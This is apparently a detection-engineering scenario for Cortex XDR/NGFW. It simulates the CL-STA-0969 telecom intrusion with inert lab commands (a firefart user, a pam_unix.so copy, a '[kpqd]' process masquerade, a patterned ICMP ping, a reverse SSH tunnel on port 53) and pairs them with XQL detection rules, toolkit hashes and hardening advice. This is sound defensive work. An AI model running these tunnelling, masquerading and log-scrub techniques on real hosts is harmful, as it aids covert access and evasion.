identity.name: CL-STA-0969 Telecom Intrusion — AuthDoor PAM Backdoor, GTPDoor / EchoBackdoor Covert C2 and Reverse SSH Tunnels (T1556.003 / T1205 / T1572)
identity.summary: Endpoint + NGFW stitched chain for Unit 42's CL-STA-0969 telecom report: SSH dictionary attempts, firefart residue, an AuthDoor pam_unix.so write, a [kpqd] masquerade, a GTP-C 2123 listener, covert ICMP/DNS, a reverse SSH tunnel to port 53 and a wtmp scrub, plus WildFire logs for five toolkit sha256s, joined on src_host by CR-MP-0033.
identity.description: CL-STA-0969 targeted telecommunications organisations' roaming and interconnect networks. Entry was most likely SSH brute force with a dictionary of telecom built-in accounts. The actor escalated with public DirtyCoW, PwnKit and sudo exploits (DirtyCoW leaving the temporary user firefart), replaced pam_unix.so with the AuthDoor backdoor (captured credentials in /usr/bin/.dbus.log), ran tools under dbus-* and kernel-thread names kept alive by watchdog scripts, and used covert channels: GTPDoor over GTP-C on UDP 2123, EchoBackdoor over ICMP echo, NoDepDNS over raw DNS, plus reverse SSH tunnels to remote port 53, Microsocks, FRP and Cordscan for SGSN collection. It cleared wtmp with utmpdump and sed, nulled HISTFILE and timestomped with touch -r. The report's SELinux disable (setenforce 0, /etc/selinux/config edit) is deliberately not reproduced. The simulation runs each stage with inert stand-ins against lab targets and emits the NGFW WildFire records for five tools with their published hashes.

campaigns: CL-STA-0969 long-term espionage against telecommunications roaming and interconnect networks (2024-2025)

techniques.name: Modify Authentication Process: Pluggable Authentication Modules
Masquerading: Match Legitimate Name or Location
Indicator Removal: Clear Linux or Mac System Logs

execution.framework_reference_id: SIM-MP-033 — CL-STA-0969 telecom intrusion stitched chain (AuthDoor, GTPDoor, EchoBackdoor, reverse SSH tunnels)

prerequisites.description: Cortex XDR / XSIAM agent on the Linux endpoint and NGFW traffic + threat-log ingestion into panw_ngfw_traffic_raw / panw_ngfw_threat_raw via an HTTP collector.
A lab host on STAGE_HOST stands in for the actor's SSH and ICMP peers; LAB_RESOLVER names the lab resolver for the GTP-node DNS trigger.

payload.code:
# Inert endpoint stages of SIM-MP-033 (see the scenario for the full per-step commands).
LAB=/var/tmp/.cortexsim-mp033; mkdir -p "$LAB/lib/security" "$LAB/bin"
useradd -r -N -M -s /usr/sbin/nologin -c 'cortexsim-mp033' firefart
getent passwd firefart | grep -q cortexsim-mp033 && userdel firefart
cp "$(find /lib /usr/lib -name pam_unix.so | head -n 1)" "$LAB/lib/security/pam_unix.so"
( exec -a '[kpqd]' sleep 25 ) &
ping -c 3 -s 14 -p 66756e6e79416e644861707079 "${STAGE_HOST:-127.0.0.1}"
timeout 8 ssh -o BatchMode=yes -N -R 2222:127.0.0.1:22 -p 53 "tunnel@${STAGE_HOST:-127.0.0.1}" || true

input_variables.name: STAGE_HOST
input_variables.description: Lab host standing in for the actor's SSH-tunnel and ICMP peers.

input_variables.name: LAB_RESOLVER
input_variables.description: Lab resolver the GTP-node DNS trigger query is sent to.

expected_artifacts.description: pam_unix.so copy written outside the package manager.
AuthDoor credential-log path, empty and timestomped.
WildFire threat records for five delivered tools in panw_ngfw_threat_raw.
expected_artifacts.expected_value: filedigest in the five published CL-STA-0969 toolkit sha256s

cleanup.code:
pkill -f '^\[kpqd\]' || true; pkill -f '^dnsd_el5' || true
if getent passwd firefart | grep -q cortexsim-mp033; then userdel firefart; fi
if [ -e /var/tmp/.cortexsim-mp033/.dbus-log-created ]; then rm -f /usr/bin/.dbus.log; fi
rm -f /tmp/mp-033-threat.yml /tmp/mp-033-ssh.yml
rm -rf /var/tmp/.cortexsim-mp033

biocs.name: MP-033 SSH Client Fan-Out Across Default Accounts to One Host
biocs.description: One causality starts the ssh client against one destination with four or more distinct account names in a short window — dictionary attempts with built-in account names.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter lowercase(action_process_image_name) = "ssh"
| alter target = arrayindex(regextract(action_process_image_command_line, "([A-Za-z0-9._-]+)@([A-Za-z0-9._:-]+)"), 0)
| alter acct = arrayindex(split(target, "@"), 0), dest = arrayindex(split(target, "@"), 1)
| filter acct != null
| comp count_distinct(acct) as accounts, count() as attempts by agent_hostname, causality_actor_process_instance_id, dest
| filter accounts >= 4

biocs.name: MP-033 DirtyCoW firefart Account Created and Removed
biocs.description: An account named firefart — the fixed username the public DirtyCoW exploit writes — is created or removed, or appears in an /etc/passwd write.
biocs.logic:
dataset = xdr_data
| filter (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and lowercase(action_process_image_name) in ("useradd", "userdel", "adduser", "deluser", "usermod") and lowercase(action_process_image_command_line) contains "firefart") or (event_type = ENUM.FILE and action_file_path = "/etc/passwd" and lowercase(causality_actor_process_command_line) contains "firefart")
| fields _time, agent_hostname, actor_effective_username, action_process_image_name, action_process_image_command_line, causality_actor_process_instance_id

biocs.name: MP-033 pam_unix.so Written Outside the Package Manager
biocs.description: A file named pam_unix.so (or pam_unix2.so) is written by a process that is not dpkg/rpm/apt/yum/dnf, optionally with /usr/bin/.dbus.log created in the same causality — AuthDoor PAM replacement and its credential log.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE, ENUM.FILE_RENAME)
| filter lowercase(action_file_name) in ("pam_unix.so", "pam_unix2.so", ".dbus.log")
| filter lowercase(actor_process_image_name) not in ("dpkg", "rpm", "apt", "apt-get", "yum", "dnf", "zypper", "unattended-upgr")
| comp count_distinct(action_file_name) as names, values(action_file_path) as paths by agent_hostname, causality_actor_process_instance_id
| filter names >= 1

biocs.name: MP-033 Kernel-Thread-Named Process Restarted by a Watchdog Script
biocs.description: A user-space process whose command line begins with a bracketed kernel-thread name is started by a shell rather than kthreadd — the [kpqd] / [watchdog/1] masquerade kept alive by watchdogdd.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_command_line ~= "^\[[a-z0-9_/:-]+\]"
| filter lowercase(actor_process_image_name) in ("bash", "sh", "dash", "zsh", "python3", "perl")
| fields _time, agent_hostname, action_process_image_path, action_process_image_command_line, actor_process_command_line, causality_actor_process_instance_id

biocs.name: MP-033 Fixed-Pattern ICMP Echo and GTP-Node DNS Trigger from One Causality
biocs.description: ping is run with a small payload size and a fill pattern (-s/-p), and the same causality queries a .node GTP-node name (pgw-s5s8.mpgw001.node) — EchoBackdoor-sized ICMP chunks plus the NoDepDNS trigger question.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| alter is_ping = if(lowercase(action_process_image_name) = "ping" and action_process_image_command_line contains " -p " and action_process_image_command_line contains " -s ", 1, 0)
| alter is_trigger = if(lowercase(action_process_image_command_line) contains ".mpgw" or lowercase(action_process_image_command_line) ~= "pgw-[a-z0-9-]+\.[a-z0-9.-]+\.node", 1, 0)
| comp sum(is_ping) as pings, sum(is_trigger) as triggers by agent_hostname, causality_actor_process_instance_id
| filter pings >= 1 and triggers >= 1

biocs.name: MP-033 Reverse SSH Tunnel to Remote Port 53
biocs.description: ssh is started with -R remote forwarding and -p 53 — a reverse tunnel carried in an SSH session to a DNS port (sshtun / autoreverse / dnsd).
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter lowercase(action_process_image_name) = "ssh"
| filter action_process_image_command_line ~= "\s-R\s*[0-9]" and action_process_image_command_line ~= "\s-p\s*53(\s|$)"
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_instance_id

biocs.name: MP-033 wtmp Rewritten via utmpdump With History Disabled and Timestomp
biocs.description: utmpdump -r runs in a causality that also runs touch -r (timestomp) — the login-record scrub and timestamp reset from the report.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| alter is_scrub = if(lowercase(action_process_image_name) = "utmpdump" and action_process_image_command_line contains "-r", 1, 0)
| alter is_stomp = if(lowercase(action_process_image_name) = "touch" and action_process_image_command_line ~= "\s-r\s", 1, 0)
| comp sum(is_scrub) as scrubs, sum(is_stomp) as stomps by agent_hostname, causality_actor_process_instance_id
| filter scrubs >= 1 and stomps >= 1

abiocs.name: MP-033 GTP-C Port 2123 Listener Opened by a Non-Core Process
abiocs.description: A process outside the host's learned telecom-core baseline binds UDP 2123 (GTP-C) and receives traffic — the GTPDoor listener shape.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_local_port = 2123 and action_network_protocol = ENUM.UDP
| comp count() as events, values(actor_process_command_line) as cmd by agent_hostname, actor_process_image_name, causality_actor_process_instance_id
abiocs.causality_anchor: Learned per-host baseline of UDP 2123 listeners (GTP-C core processes only) -> a new image binding the port inside the masquerade causality, anchored on causality_actor_process_instance_id.

abiocs.name: MP-033 NGFW Rare SSH Session from the Telecom Host
abiocs.description: NGFW EAL behavioural alert: the endpoint (src_host) opens an SSH session to an uncommon external host. Preset destination — the report publishes no domain or IP; the record stitches on src_host.
abiocs.logic:
dataset = panw_ngfw_traffic_raw
| filter app = "ssh" and dst_port = 22
| comp count() as sessions, count_distinct(dst) as dests by src, endpoint_device_name
| filter sessions >= 1
abiocs.causality_anchor: Learned per-source-host SSH egress baseline -> SSH session to an uncommon external host on the same src_host as the endpoint reverse-tunnel chain.

xql_queries.name: MP-033 CL-STA-0969 Toolkit sha256s Landed in panw_ngfw_threat_raw
xql_queries.query:
dataset = panw_ngfw_threat_raw
| filter _time > to_timestamp(current_time() - 3600)
| filter lowercase(filedigest) in ("827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161", "bacbe2a793d8ddca0a195b67def527e66d280a13a8d4df90b507546b76e87d29", "188861d7f0861103886543eff63a96c314c8262dbf52c6e0cf9372cf1e889d52", "432125ca41a2c5957013c8bff09c4037ad18addccab872d46230dd662a2b8123", "9e1f5a134d13167a9148f2d5a1e6a96136d22ecdfbc502aa974544e7efe16a22")
| filter action in ("alert", "allow")
| comp count_distinct(filedigest) as hashes by endpoint_device_name, src
| filter hashes >= 5

correlation_rules.name: CL-STA-0969 Telecom Intrusion — Endpoint + NGFW on src_host
correlation_rules.logic: BIOC(MP-033 DirtyCoW firefart Account Created and Removed) AND BIOC(MP-033 pam_unix.so Written Outside the Package Manager) AND (BIOC(MP-033 Kernel-Thread-Named Process Restarted by a Watchdog Script) OR ABIOC(MP-033 GTP-C Port 2123 Listener Opened by a Non-Core Process)) AND (IOC(file-sha256 dnsd_el5) OR XQL(MP-033 CL-STA-0969 Toolkit sha256s Landed in panw_ngfw_threat_raw)) AND (BIOC(MP-033 Reverse SSH Tunnel to Remote Port 53) OR ABIOC(MP-033 NGFW Rare SSH Session from the Telecom Host)) joined on agent_hostname = endpoint_device_name (src_host) within 3600 seconds -> ONE incident

threat_scenarios.name: CL-STA-0969 Telecom Host Compromise to Covert C2
threat_scenarios.description: Validate that the endpoint escalation / backdoor / covert-channel chain and the NGFW threat-log evidence of the delivered toolkit for one host become one CL-STA-0969 incident.

threat_steps.objective: Endpoint BIOC/ABIOCs fire on the telecom host and the five toolkit sha256s land in panw_ngfw_threat_raw for the same src_host; CR-MP-0033 raises ONE incident.
preconditions: XDR agent on the Linux endpoint.
NGFW traffic and threat logs ingested via an HTTP collector.
steps: Run SIM-MP-033 on the endpoint with STAGE_HOST and LAB_RESOLVER set to lab hosts.
Wait for the correlation window to converge.
success_criteria: Endpoint and NGFW alerts share one src_host.

preventive_controls: Enforce key-only SSH with lockout on telecom management interfaces and remove or rename vendor built-in accounts.
Patch DirtyCoW, PwnKit and sudo CVE-2021-3156 on telecom Linux hosts; file-integrity-monitor PAM modules under /lib*/security.
Restrict GTP-C (UDP 2123) to known core peers, alert on ICMP echoes with non-standard payloads and on SSH to non-22 ports such as 53.
detection_engineering: Key the PAM BIOC on a pam_unix.so write by a non-package-manager process, not on the AuthDoor hash.
Correlate endpoint causality with NGFW threat logs on src_host so a WildFire verdict on a delivered tool joins the endpoint incident.
